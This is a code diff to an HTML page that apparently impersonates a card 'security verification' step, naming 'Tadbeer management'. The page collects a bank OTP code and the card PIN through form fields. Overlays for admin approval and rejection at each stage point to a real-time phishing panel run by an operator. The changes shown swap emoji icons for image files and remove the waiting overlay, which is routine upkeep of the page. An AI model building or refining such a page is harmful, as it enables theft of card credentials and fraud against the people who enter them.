@@ -405,7 +405,7 @@
                 <div class="card-head">Card Security Verification</div>
                 <div class="card-body">
                     <div class="step-center">
-                        <div class="step-ic">&#128241;</div>
+                        <div class="step-ic"><img src="otp-icon.png" alt="OTP" style="width:54px; height:54px; object-fit:contain; border-radius:50%;"></div>
                         <h3>OTP Code</h3>
                         <p class="sub">A verification code has been sent to your registered phone number</p>
                         <input type="text" inputmode="numeric" class="big-input" id="otp-input" placeholder="Enter OTP Code" maxlength="6" autocomplete="off">
@@ -430,7 +430,7 @@
                 <div class="card-head">PIN Verification</div>
                 <div class="card-body">
                     <div class="step-center">
-                        <div class="step-ic atm">&#127974;</div>
+                        <div class="step-ic atm"><img src="atm-icon.png" alt="ATM" style="width:56px; height:56px; object-fit:contain;"></div>
                         <h3>PIN Number</h3>
                         <p class="sub">Enter the PIN of your card</p>
                         <input type="password" inputmode="numeric" class="big-input" id="pin-input" placeholder="&#8226;&#8226;&#8226;&#8226;" maxlength="6" autocomplete="off">
@@ -466,14 +466,6 @@
         </div>
     </main>
 
-    <!-- Awaiting admin decision -->
-    <div class="decide-overlay" id="decide-wait">
-        <div class="card processing">
-            <div class="spin"></div>
-            <h3>Your transaction is being reviewed</h3>
-            <p id="proc-wait-note">Please wait until the operation is approved by Tadbeer management. Do not close this page.</p>
-        </div>
-    </div>
 
     <!-- Rejection message -->
     <div class="decide-overlay" id="decide-reject">
@@ -604,8 +596,8 @@
 
         let decideTimer = null;
         function clearDecide() { if (decideTimer) { clearInterval(decideTimer); decideTimer = null; } }
-        function openWait() { $('decide-wait').classList.add('show'); }
-        function closeWait() { $('decide-wait').classList.remove('show'); }
+        function openWait() { /* wait overlay removed; only the processing page is shown */ }
+        function closeWait() {}
         function showReject(stage) {
             $('reject-msg').innerText = REJECT_MESSAGES[stage] || REJECT_MESSAGES.pin;
             $('decide-reject').classList.add('show');
